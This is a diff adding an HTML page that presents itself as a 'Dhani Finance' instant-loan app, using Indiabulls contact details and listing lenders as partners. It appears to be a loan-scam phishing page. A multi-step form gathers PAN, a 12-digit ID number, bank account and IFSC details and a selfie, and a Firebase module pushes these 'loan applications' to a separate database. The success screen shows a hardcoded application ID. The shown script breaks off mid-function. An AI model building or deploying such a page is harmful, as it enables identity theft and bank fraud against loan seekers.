@@ -1,0 +1,798 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Dhani Finance - Instant Loan App</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script type="importmap">
+    {
+      "imports": {
+        "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
+        "firebase/analytics": "https://www.gstatic.com/firebasejs/10.8.0/firebase-analytics.js",
+        "firebase/database": "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js"
+      }
+    }
+  </script>
+  <style>
+    body {
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+      font-family: Arial, sans-serif;
+    }
+  </style>
+</head>
+<body class="bg-gray-900 flex justify-center items-center min-h-screen">
+
+  <div class="w-full max-w-md bg-[#f8f9fa] min-h-screen shadow-2xl flex flex-col justify-between relative overflow-x-hidden">
+    
+    <header class="bg-[#0b1d3a] text-white p-3 flex items-center justify-between shadow-md sticky top-0 z-30">
+      <div class="flex items-center space-x-2 bg-white px-3 py-1.5 rounded shadow-sm">
+        <span class="font-bold text-[#0b1d3a] text-xs">DHANI FINANCE</span>
+      </div>
+    </header>
+
+    <main class="flex-1 overflow-y-auto pb-24">
+      
+      <div id="tab-home" class="page-tab space-y-4">
+        
+        <div class="w-full bg-white shadow-sm">
+          <img src="https://images.unsplash.com/photo-1522071820081-009f0129c71c?auto=format&fit=crop&w=600&q=80" alt="Team meeting" class="w-full h-48 object-cover">
+        </div>
+
+        <div class="px-4">
+          <div class="bg-white border border-gray-200 rounded-2xl p-4 shadow-sm flex items-center justify-between">
+            <div class="space-y-2 flex-1 pr-2">
+              <div class="flex items-center space-x-1">
+                <span class="font-bold text-[#0b1d3a] text-xs">DHANI FINANCE</span>
+                <span class="text-amber-500 text-xs">✔</span>
+              </div>
+              <h2 class="text-xl font-black text-[#0b1d3a] leading-tight">Get a Personal Loan with Ease!</h2>
+              <p class="text-[11px] text-gray-500 leading-relaxed">Xpress Loan simplifies managing your emergency fund needs, anytime, anywhere, with just a click.</p>
+              <p class="text-[10px] text-gray-400">Enjoy instant loans at a low-interest rate, hassle-free</p>
+              <button onclick="switchTab('apply')" class="bg-red-600 hover:bg-red-700 text-white font-bold text-xs px-5 py-2 rounded-full shadow uppercase tracking-wider block text-center transition">
+                Apply Now
+              </button>
+            </div>
+            <div class="w-32 bg-gray-50 p-2 rounded-xl border border-gray-100 text-center flex flex-col items-center justify-center">
+              <div class="text-[10px] font-bold text-blue-900 bg-blue-50 px-2 py-0.5 rounded mb-1">dhani pay</div>
+              <div class="text-xs font-bold text-gray-700">⚡ Instant Loans</div>
+              <div class="text-[10px] text-red-500 font-bold my-0.5">📉 Low Interest</div>
+              <div class="text-[10px] font-bold text-gray-700">💰 Quick Disbursal</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="px-4">
+          <div class="bg-white border border-gray-200 rounded-2xl p-4 space-y-2 shadow-sm">
+            <h3 class="font-bold text-[#0b1d3a] text-base">About Dhani Finance</h3>
+            <p class="text-xs text-gray-600 leading-relaxed">
+              We help individuals & small businesses access credit with speed and clarity. Apply online, upload basic documents, and get rapid in-principle decisions from partnered banks/NBFCs. Getting a loan is simple — fill the form, and we will get back to you quickly. Once approved, the amount will be transferred to your account. T&C*
+            </p>
+          </div>
+        </div>
+
+        <div class="mx-4 bg-[#4a5568] text-white rounded-2xl p-4 space-y-3 shadow-inner">
+          <h3 class="text-center font-bold text-amber-400 text-sm">- Instant Personal Loan Online -</h3>
+          <p class="text-[11px] text-gray-200 leading-relaxed">
+            Transparent personal & business loans. No hidden charges. 100% online application with quick in-principle approvals.
+          </p>
+          <p class="text-[11px] text-gray-200 leading-relaxed">
+            You can now get a personal loan online for trips, home furnishings, weddings, medical emergencies, and more. When you apply at Dhani Finance, we connect you with partnered lenders based on what you need.
+          </p>
+          <div class="space-y-1 text-[11px] text-gray-200 pt-1">
+            <p>1. Avail a Personal Loan of up to ₹5 Lakhs</p>
+            <p>2. Business Loan from ₹50k–₹10L for working capital & expansion</p>
+          </div>
+        </div>
+
+        <div class="px-4 space-y-3">
+          <h3 class="font-bold text-[#0b1d3a] text-base">Our Services</h3>
+          <div class="grid grid-cols-2 gap-3">
+            <div class="bg-white p-3.5 rounded-2xl border border-gray-200 shadow-sm flex flex-col justify-between">
+              <div>
+                <span class="text-xl">🏠</span>
+                <h4 class="font-bold text-xs text-[#0b1d3a] mt-2">Personal Loan — Up to ₹5L</h4>
+                <p class="text-[10px] text-gray-500 mt-1">Quick unsecured funds. Minimal documentation & flexible tenure.</p>
+              </div>
+            </div>
+            <div class="bg-white p-3.5 rounded-2xl border border-gray-200 shadow-sm flex flex-col justify-between">
+              <div>
+                <span class="text-xl">💼</span>
+                <h4 class="font-bold text-xs text-[#0b1d3a] mt-2">Business Loan — ₹50k–₹10L</h4>
+                <p class="text-[10px] text-gray-500 mt-1">Working capital & expansion. Bank statements & ITR as applicable.</p>
+              </div>
+            </div>
+            <div class="bg-white p-3.5 rounded-2xl border border-gray-200 shadow-sm flex flex-col justify-between">
+              <div>
+                <span class="text-xl">🚗</span>
+                <h4 class="font-bold text-xs text-[#0b1d3a] mt-2">Vehicle / Two-Wheeler — Up to ₹10L</h4>
+                <p class="text-[10px] text-gray-500 mt-1">New or used vehicle purchase. Income proof, KYC & address proof.</p>
+              </div>
+            </div>
+            <div class="bg-white p-3.5 rounded-2xl border border-gray-200 shadow-sm flex flex-col justify-between">
+              <div>
+                <span class="text-xl">🎓</span>
+                <h4 class="font-bold text-xs text-[#0b1d3a] mt-2">Education Loan</h4>
+                <p class="text-[10px] text-gray-500 mt-1">Fund your studies with flexible repayment options.</p>
+              </div>
+            </div>
+            <div class="bg-white p-3.5 rounded-2xl border border-gray-200 shadow-sm flex flex-col justify-between">
+              <div>
+                <span class="text-xl">🪙</span>
+                <h4 class="font-bold text-xs text-[#0b1d3a] mt-2">Gold Loan</h4>
+                <p class="text-[10px] text-gray-500 mt-1">Quick funds against gold with transparent rates.</p>
+              </div>
+            </div>
+            <div class="bg-white p-3.5 rounded-2xl border border-gray-200 shadow-sm flex flex-col justify-between">
+              <div>
+                <span class="text-xl">📈</span>
+                <h4 class="font-bold text-xs text-[#0b1d3a] mt-2">MSME Loan</h4>
+                <p class="text-[10px] text-gray-500 mt-1">Credit support for small & medium enterprises.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="px-4 space-y-3">
+          <h3 class="font-bold text-[#0b1d3a] text-base">What Customers Say</h3>
+          <div class="bg-white border border-gray-200 p-3.5 rounded-xl shadow-sm text-xs space-y-1">
+            <p class="text-gray-700 font-medium">“Smooth application and fast approval. Great experience!”</p>
+            <span class="text-[#0b1d3a] font-bold block">Rohit • Delhi</span>
+          </div>
+          <div class="bg-white border border-gray-200 p-3.5 rounded-xl shadow-sm text-xs space-y-1">
+            <p class="text-gray-700 font-medium">“EMI calculator helped me pick the perfect tenure.”</p>
+            <span class="text-[#0b1d3a] font-bold block">Pooja • Mumbai</span>
+          </div>
+          <div class="bg-white border border-gray-200 p-3.5 rounded-xl shadow-sm text-xs space-y-1">
+            <p class="text-gray-700 font-medium">“Transparent process and supportive team.”</p>
+            <span class="text-[#0b1d3a] font-bold block">Amit • Pune</span>
+          </div>
+        </div>
+
+        <div class="px-4 space-y-3">
+          <h3 class="font-bold text-[#0b1d3a] text-base">Our Lending Partners</h3>
+          <div class="grid grid-cols-2 gap-3">
+            <div class="bg-white p-4 rounded-xl border border-gray-200 text-center shadow-sm">
+              <span class="font-bold text-sm text-orange-600 block">IIFL FINANCE</span>
+              <span class="text-[10px] text-gray-500">IIFL Finance</span>
+            </div>
+            <div class="bg-white p-4 rounded-xl border border-gray-200 text-center shadow-sm">
+              <span class="font-bold text-sm text-blue-800 block">GROMOR</span>
+              <span class="text-[10px] text-gray-500">Gromor Finance</span>
+            </div>
+            <div class="bg-white p-4 rounded-xl border border-gray-200 text-center shadow-sm">
+              <span class="font-bold text-sm text-indigo-700 block">FlexiLoans</span>
+              <span class="text-[10px] text-gray-500">FlexiLoans</span>
+            </div>
+            <div class="bg-white p-4 rounded-xl border border-gray-200 text-center shadow-sm">
+              <span class="font-bold text-sm text-blue-600 block">LENDINGKART</span>
+              <span class="text-[10px] text-gray-500">Lendingkart</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="px-4 space-y-3">
+          <h3 class="font-bold text-[#0b1d3a] text-base text-center">Dhani Finance Statistics</h3>
+          <div class="border border-amber-300 bg-white rounded-2xl p-4 text-center shadow-sm">
+            <span class="text-2xl">🪙</span>
+            <div class="text-xl font-black text-[#0b1d3a] mt-1">59,547,524</div>
+            <div class="text-xs font-semibold text-gray-600">Amount Disbursed</div>
+          </div>
+          <div class="border border-amber-300 bg-white rounded-2xl p-4 text-center shadow-sm">
+            <span class="text-2xl">⭐</span>
+            <div class="text-xl font-black text-[#0b1d3a] mt-1">1,554</div>
+            <div class="text-xs font-semibold text-gray-600">Happy Customer</div>
+          </div>
+          <div class="border border-amber-300 bg-white rounded-2xl p-4 text-center shadow-sm">
+            <span class="text-2xl">🤝</span>
+            <div class="text-xl font-black text-[#0b1d3a] mt-1">25</div>
+            <div class="text-xs font-semibold text-gray-600">Business Partner</div>
+          </div>
+        </div>
+
+        <footer class="bg-[#0b1d3a] text-white p-5 space-y-4 text-xs mt-6">
+          <div>
+            <h4 class="font-bold tracking-wide mb-2 text-amber-400">Office Details ---</h4>
+            <p class="text-gray-300">📍 Address : Bandra, Kurla Complex, Mumbai - 400050, Maharashtra</p>
+            <p class="text-gray-300 mt-1">✉️ loansupport@indiabulls.com</p>
+            <p class="text-gray-300 mt-1">📞 0124-6555-555</p>
+          </div>
+          <div class="border-t border-blue-900 pt-3">
+            <h4 class="font-bold tracking-wide mb-2 text-amber-400">Our Partners ---</h4>
+            <p class="text-gray-300 text-[11px] leading-relaxed">IIFL Finance, Gromor Finance, FlexiLoans, Lendingkart</p>
+          </div>
+          <div class="border-t border-blue-900 pt-3">
+            <h4 class="font-bold tracking-wide mb-2 text-amber-400">Quick Links ---</h4>
+            <ul class="space-y-1.5 text-gray-300">
+              <li onclick="switchTab('home')" class="cursor-pointer hover:text-white">> Home</li>
+              <li onclick="switchTab('emi')" class="cursor-pointer hover:text-white">> EMI Calculator</li>
+              <li class="cursor-pointer hover:text-white">> Privacy Policy</li>
+              <li class="cursor-pointer hover:text-white">> Contact Us</li>
+            </ul>
+          </div>
+        </footer>
+      </div>
+
+      <div id="tab-apply" class="page-tab hidden px-4 space-y-4 pt-4">
+        
+        <div class="flex justify-between space-x-1 px-1">
+          <div id="bar-1" class="h-1 flex-1 bg-blue-600 rounded-full transition-all"></div>
+          <div id="bar-2" class="h-1 flex-1 bg-gray-300 rounded-full transition-all"></div>
+          <div id="bar-3" class="h-1 flex-1 bg-gray-300 rounded-full transition-all"></div>
+          <div id="bar-4" class="h-1 flex-1 bg-gray-300 rounded-full transition-all"></div>
+          <div id="bar-5" class="h-1 flex-1 bg-gray-300 rounded-full transition-all"></div>
+        </div>
+
+        <div id="apply-step-1" class="apply-step bg-white border border-gray-200 rounded-2xl p-5 shadow-sm space-y-4">
+          <h3 class="font-black text-[#0b1d3a] text-xl text-center">Apply for Instant Loan</h3>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Employment Type</label>
+            <div class="grid grid-cols-2 gap-2 mt-1" id="emp-group">
+              <button type="button" onclick="selectToggle(this)" data-value="Salaried" class="toggle-btn border border-blue-600 text-[#0b1d3a] bg-blue-50 py-2.5 rounded-xl text-xs font-bold shadow-sm">Salaried</button>
+              <button type="button" onclick="selectToggle(this)" data-value="Self Employed" class="toggle-btn border border-gray-300 text-gray-600 py-2.5 rounded-xl text-xs font-semibold">Self Employed</button>
+            </div>
+          </div>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Select Loan Type</label>
+            <select id="form-loantype" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600 bg-white">
+              <option>Personal Loan</option>
+              <option>Business Loan</option>
+              <option>Vehicle Loan</option>
+              <option>Education Loan</option>
+            </select>
+          </div>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Loan Amount (₹)</label>
+            <input type="number" id="form-amount" value="50000" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+          </div>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Tenure (Years)</label>
+            <select id="form-tenure" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600 bg-white">
+              <option>1 Year</option>
+              <option>2 Years</option>
+              <option>3 Years</option>
+              <option>5 Years</option>
+            </select>
+          </div>
+
+          <div class="flex items-center space-x-2 pt-1">
+            <input type="checkbox" id="terms" checked class="rounded border-gray-300 w-4 h-4 text-blue-600">
+            <label for="terms" class="text-[11px] text-gray-600">I agree to the Terms & Conditions and give KYC consent.</label>
+          </div>
+
+          <button onclick="nextApplyStep(2)" class="w-full bg-[#0077cc] hover:bg-blue-700 text-white font-bold py-3.5 rounded-xl shadow-md transition uppercase tracking-wider text-sm">
+            NEXT
+          </button>
+        </div>
+
+        <div id="apply-step-2" class="apply-step hidden bg-white border border-gray-200 rounded-2xl p-5 shadow-sm space-y-3.5">
+          <h3 class="font-black text-[#0b1d3a] text-xl text-center">Apply for Instant Loan</h3>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Full Name</label>
+            <input type="text" id="form-name" placeholder="Full Name" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+          </div>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Father / Husband Name</label>
+            <input type="text" id="form-father" placeholder="Father / Husband Name" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+          </div>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Mobile</label>
+            <input type="tel" id="form-mobile" maxlength="10" placeholder="10 digit mobile" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+          </div>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Email</label>
+            <input type="email" id="form-email" placeholder="name@example.com" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+          </div>
+
+          <div class="grid grid-cols-2 gap-2">
+            <div>
+              <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Date of Birth</label>
+              <input type="date" id="form-dob" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-xs focus:outline-none focus:border-blue-600">
+            </div>
+            <div>
+              <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">District Pincode</label>
+              <input type="text" id="form-pincode" maxlength="6" placeholder="Pincode" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+            </div>
+          </div>
+
+          <div class="grid grid-cols-2 gap-2">
+            <div>
+              <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">District</label>
+              <input type="text" id="form-district" placeholder="District" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+            </div>
+            <div>
+              <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">State</label>
+              <input type="text" id="form-state" placeholder="State" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+            </div>
+          </div>
+
+          <button onclick="nextApplyStep(3)" class="w-full bg-[#0077cc] hover:bg-blue-700 text-white font-bold py-3.5 rounded-xl shadow-md uppercase tracking-wider text-sm mt-2 transition">
+            NEXT
+          </button>
+          <button onclick="nextApplyStep(1)" class="w-full bg-white hover:bg-gray-50 border border-gray-300 text-gray-700 font-bold py-3 rounded-xl shadow-sm uppercase tracking-wider text-xs transition">
+            Back
+          </button>
+        </div>
+
+        <div id="apply-step-3" class="apply-step hidden bg-white border border-gray-200 rounded-2xl p-5 shadow-sm space-y-4">
+          <h3 class="font-black text-[#0b1d3a] text-xl text-center">Apply for Instant Loan</h3>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">PAN Number</label>
+            <input type="text" id="form-pan" placeholder="ABCDE1234F" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600 uppercase">
+          </div>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">12 Digit ID Number</label>
+            <input type="text" id="form-aadhaar" maxlength="12" placeholder="XXXXXXXXXXXX" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+          </div>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Gender</label>
+            <div class="grid grid-cols-2 gap-2 mt-1" id="gender-group">
+              <button type="button" onclick="selectToggle(this)" data-value="Male" class="toggle-btn border border-blue-600 text-[#0b1d3a] bg-blue-50 py-2.5 rounded-xl text-xs font-bold">Male</button>
+              <button type="button" onclick="selectToggle(this)" data-value="Female" class="toggle-btn border border-gray-300 text-gray-600 py-2.5 rounded-xl text-xs font-semibold">Female</button>
+            </div>
+          </div>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Marital Status</label>
+            <div class="grid grid-cols-2 gap-2 mt-1" id="marital-group">
+              <button type="button" onclick="selectToggle(this)" data-value="Married" class="toggle-btn border border-blue-600 text-[#0b1d3a] bg-blue-50 py-2.5 rounded-xl text-xs font-bold">Married</button>
+              <button type="button" onclick="selectToggle(this)" data-value="Unmarried" class="toggle-btn border border-gray-300 text-gray-600 py-2.5 rounded-xl text-xs font-semibold">Unmarried</button>
+            </div>
+          </div>
+
+          <button onclick="nextApplyStep(4)" class="w-full bg-[#0077cc] hover:bg-blue-700 text-white font-bold py-3.5 rounded-xl shadow-md uppercase tracking-wider text-sm mt-2 transition">
+            NEXT
+          </button>
+          <button onclick="nextApplyStep(2)" class="w-full bg-white hover:bg-gray-50 border border-gray-300 text-gray-700 font-bold py-3 rounded-xl shadow-sm uppercase tracking-wider text-xs transition">
+            Back
+          </button>
+        </div>
+
+        <div id="apply-step-4" class="apply-step hidden bg-white border border-gray-200 rounded-2xl p-5 shadow-sm space-y-4">
+          <h3 class="font-black text-[#0b1d3a] text-xl text-center">Apply for Instant Loan</h3>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Account Type</label>
+            <div class="grid grid-cols-2 gap-2 mt-1" id="account-group">
+              <button type="button" onclick="selectToggle(this)" data-value="Savings Account" class="toggle-btn border border-blue-600 text-[#0b1d3a] bg-blue-50 py-2.5 rounded-xl text-xs font-bold">Savings Account</button>
+              <button type="button" onclick="selectToggle(this)" data-value="Current Account" class="toggle-btn border border-gray-300 text-gray-600 py-2.5 rounded-xl text-xs font-semibold">Current Account</button>
+            </div>
+          </div>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Bank Name</label>
+            <input type="text" id="form-bankname" placeholder="Bank Name" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+          </div>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">Account Number</label>
+            <input type="text" id="form-accountno" placeholder="Account Number" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+          </div>
+
+          <div>
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider">IFSC Code</label>
+            <input type="text" id="form-ifsc" placeholder="IFSC CODE" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm uppercase focus:outline-none focus:border-blue-600">
+          </div>
+
+          <button onclick="nextApplyStep(5)" class="w-full bg-[#0077cc] hover:bg-blue-700 text-white font-bold py-3.5 rounded-xl shadow-md uppercase tracking-wider text-sm mt-2 transition">
+            NEXT
+          </button>
+          <button onclick="nextApplyStep(3)" class="w-full bg-white hover:bg-gray-50 border border-gray-300 text-gray-700 font-bold py-3 rounded-xl shadow-sm uppercase tracking-wider text-xs transition">
+            Back
+          </button>
+        </div>
+
+        <div id="apply-step-5" class="apply-step hidden bg-white border border-gray-200 rounded-2xl p-5 shadow-sm space-y-4">
+          <h3 class="font-black text-[#0b1d3a] text-xl text-center">Apply for Instant Loan</h3>
+          
+          <div class="space-y-1">
+            <h4 class="font-bold text-xs text-[#0b1d3a]">E-KYC Verification</h4>
+            <p class="text-[11px] text-gray-500 leading-tight">कृपया रोशनी वाली जगह पर जाएँ और सेल्फी लें या फोटो अपलोड करें।</p>
+          </div>
+
+          <div class="w-full h-48 bg-black rounded-2xl flex items-center justify-center relative overflow-hidden shadow-inner">
+            <video id="camera-stream" autoplay playsinline class="w-full h-full object-cover hidden"></video>
+            <canvas id="camera-canvas" class="hidden"></canvas>
+            <img id="captured-preview" class="w-full h-full object-cover hidden" alt="Selfie Preview">
+            <div id="camera-placeholder" class="text-gray-400 text-xs flex flex-col items-center space-y-2">
+              <span class="text-3xl">📷</span>
+              <span>Camera Offline / No Photo</span>
+            </div>
+          </div>
+
+          <div class="grid grid-cols-2 gap-2">
+            <button type="button" onclick="startCamera()" class="bg-white hover:bg-gray-50 border border-gray-300 text-gray-800 font-bold py-2.5 rounded-xl text-xs shadow-sm uppercase tracking-wider transition">
+              Start Camera
+            </button>
+            <button type="button" onclick="capturePhoto()" class="bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-2.5 rounded-xl text-xs shadow-sm uppercase tracking-wider transition">
+              Capture Photo
+            </button>
+          </div>
+
+          <div class="border-t border-gray-100 pt-3">
+            <label class="text-[11px] text-gray-500 font-bold uppercase tracking-wider block mb-1">Or Upload Image from Device (If camera fails)</label>
+            <input type="file" id="upload-photo-input" accept="image/*" onchange="handleImageUpload(event)" class="w-full text-xs text-gray-500 file:mr-4 file:py-2 file:px-4 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-blue-50 file:text-blue-700 hover:file:bg-blue-100 cursor-pointer border border-gray-200 rounded-xl p-1">
+          </div>
+
+          <button onclick="completeApplication()" class="w-full bg-[#0077cc] hover:bg-blue-700 text-white font-bold py-3.5 rounded-xl shadow-md uppercase tracking-wider text-sm transition">
+            FINAL SUBMIT
+          </button>
+          <button onclick="nextApplyStep(4)" class="w-full bg-white hover:bg-gray-50 border border-gray-300 text-gray-700 font-bold py-3 rounded-xl shadow-sm uppercase tracking-wider text-xs transition">
+            Back
+          </button>
+        </div>
+
+        <div id="apply-step-6" class="apply-step hidden bg-white border border-gray-200 rounded-2xl p-6 shadow-sm text-center space-y-4">
+          <div class="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center text-3xl mx-auto shadow-inner">
+            ✓
+          </div>
+          <div class="space-y-1">
+            <h3 class="font-black text-[#0b1d3a] text-xl">Congratulations!</h3>
+            <p class="text-xs text-gray-500">Your loan application has been submitted successfully.</p>
+          </div>
+
+          <div class="bg-blue-50/70 border border-blue-100 rounded-xl p-4 text-left space-y-2.5 text-xs">
+            <div class="flex justify-between border-b border-blue-100 pb-2">
+              <span class="text-gray-500">Applicant</span>
+              <span id="disp-name" class="font-bold text-[#0b1d3a]">Applicant</span>
+            </div>
+            <div class="flex justify-between border-b border-blue-100 pb-2">
+              <span class="text-gray-500">Application ID</span>
+              <span id="disp-appid" class="font-bold text-[#0b1d3a]">DH-27663687</span>
+            </div>
+            <div class="flex justify-between">
+              <span class="text-gray-500">Status</span>
+              <span class="font-bold text-amber-600 bg-amber-50 px-2 py-0.5 rounded">Pending</span>
+            </div>
+          </div>
+
+          <button onclick="switchTab('home')" class="w-full bg-[#0077cc] hover:bg-blue-700 text-white font-bold py-3.5 rounded-xl shadow-md uppercase tracking-wider text-sm transition">
+            Back to Home
+          </button>
+        </div>
+
+      </div>
+
+      <div id="tab-emi" class="page-tab hidden px-4 space-y-4 pt-4">
+        <div class="bg-[#0b1d3a] text-white p-4 rounded-xl shadow mb-2">
+          <h3 class="font-black text-lg">EMI Calculator</h3>
+        </div>
+
+        <div class="bg-white border border-gray-200 rounded-2xl p-5 shadow-sm space-y-4">
+          <div>
+            <label class="text-xs text-gray-500 font-semibold">Loan Amount (₹)</label>
+            <input type="number" id="calc-amount" value="100000" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+          </div>
+
+          <div>
+            <label class="text-xs text-gray-500 font-semibold">Interest Rate (%)</label>
+            <input type="number" id="calc-rate" value="5.99" step="0.01" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+          </div>
+
+          <div>
+            <label class="text-xs text-gray-500 font-semibold">Loan Tenure (Years)</label>
+            <input type="number" id="calc-years" value="3" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+          </div>
+
+          <div>
+            <label class="text-xs text-gray-500 font-semibold">Loan Tenure (Months)</label>
+            <input type="number" id="calc-months" value="0" class="w-full mt-1 p-3 border border-gray-300 rounded-xl text-sm focus:outline-none focus:border-blue-600">
+          </div>
+
+          <button onclick="calculateEMI()" class="w-full bg-[#0077cc] hover:bg-blue-700 text-white font-bold py-3.5 rounded-xl shadow-md transition uppercase tracking-wider">
+            CALCULATE EMI
+          </button>
+
+          <div class="space-y-2.5 pt-2">
+            <div class="bg-blue-50/70 border border-blue-100 p-3.5 rounded-xl">
+              <span class="text-[11px] text-gray-500 block font-medium">Loan EMI</span>
+              <span id="res-emi" class="text-lg font-black text-[#0b1d3a]">₹ 3,042</span>
+            </div>
+            <div class="bg-blue-50/70 border border-blue-100 p-3.5 rounded-xl">
+              <span class="text-[11px] text-gray-500 block font-medium">Total Interest Payable</span>
+              <span id="res-interest" class="text-lg font-black text-[#0b1d3a]">₹ 9,503</span>
+            </div>
+            <div class="bg-blue-50/70 border border-blue-100 p-3.5 rounded-xl">
+              <span class="text-[11px] text-gray-500 block font-medium">Total Payment (Principal + Interest)</span>
+              <span id="res-total" class="text-lg font-black text-[#0b1d3a]">₹ 1,09,503</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </main>
+
+    <nav class="bg-white border-t border-gray-200 fixed bottom-0 max-w-md w-full flex justify-around py-2.5 z-40 shadow-2xl">
+      <button onclick="switchTab('home')" id="nav-home" class="nav-btn flex flex-col items-center text-blue-900 transition">
+        <span class="text-xl">🏠</span>
+        <span class="text-[10px] font-bold mt-0.5">Home</span>
+      </button>
+      <button onclick="switchTab('apply')" id="nav-apply" class="nav-btn flex flex-col items-center text-gray-400 transition">
+        <span class="text-xl">💲</span>
+        <span class="text-[10px] font-bold mt-0.5">Apply</span>
+      </button>
+      <button onclick="switchTab('emi')" id="nav-emi" class="nav-btn flex flex-col items-center text-gray-400 transition">
+        <span class="text-xl">💳</span>
+        <span class="text-[10px] font-bold mt-0.5">EMI</span>
+      </button>
+    </nav>
+
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "firebase/app";
+    import { getAnalytics } from "firebase/analytics";
+    import { getDatabase, ref, push } from "firebase/database";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyB3dECm23n4CpMKcoGrL_CXzB7-swb5w8I",
+      authDomain: "dhanifinance-4ec9f.firebaseapp.com",
+      databaseURL: "https://dhanifinance-4ec9f-default-rtdb.firebaseio.com",
+      projectId: "dhanifinance-4ec9f",
+      storageBucket: "dhanifinance-4ec9f.firebasestorage.app",
+      messagingSenderId: "606890873547",
+      appId: "1:606890873547:web:d0f725259e26497e81014e",
+      measurementId: "G-6DPE35JPWN"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+    const db = getDatabase(app);
+
+    // Expose Firebase Database function to global scope so form submission can push data
+    window.saveToFirebaseDatabase = function(appData) {
+      const dbRef = ref(db, 'loanApplications');
+      push(dbRef, appData)
+        .then(() => {
+          console.log("Data successfully saved to Firebase Realtime Database!");
+        })
+        .catch((error) => {
+          console.error("Error saving data to Firebase:", error);
+        });
+    };
+  </script>
+
+  <script>
+    let capturedImageData = "";
+    let mediaStream = null;
+
+    function switchTab(tabName) {
+      document.querySelectorAll('.page-tab').forEach(tab => tab.classList.add('hidden'));
+      document.getElementById('tab-' + tabName).classList.remove('hidden');
+
+      document.querySelectorAll('.nav-btn').forEach(btn => {
+        btn.classList.remove('text-blue-900');
+        btn.classList.add('text-gray-400');
+      });
+      document.getElementById('nav-' + tabName).classList.remove('text-gray-400');
+      document.getElementById('nav-' + tabName).classList.add('text-blue-900');
+      
+      document.querySelector('main').scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function nextApplyStep(stepNum) {
+      document.querySelectorAll('.apply-step').forEach(step => step.classList.add('hidden'));
+      document.getElementById('apply-step-' + stepNum).classList.remove('hidden');
+
+      for(let i=1; i<=5; i++) {
+        let bar = document.getElementById('bar-' + i);
+        if(bar) {
+          if(i <= stepNum) {
+            bar.classList.remove('bg-gray-300');
+            bar.classList.add('bg-blue-600');
+          } else {
+            bar.classList.remove('bg-blue-600');
+            bar.classList.add('bg-gray-300');
+          }
+        }
+      }
+      document.querySelector('main').scrollTo({ top: 0, behavior: 'smooth' });
+    }
+
+    function selectToggle(btn) {
+      let parent = btn.parentElement;
+      parent.querySelectorAll('.toggle-btn').forEach(b => {
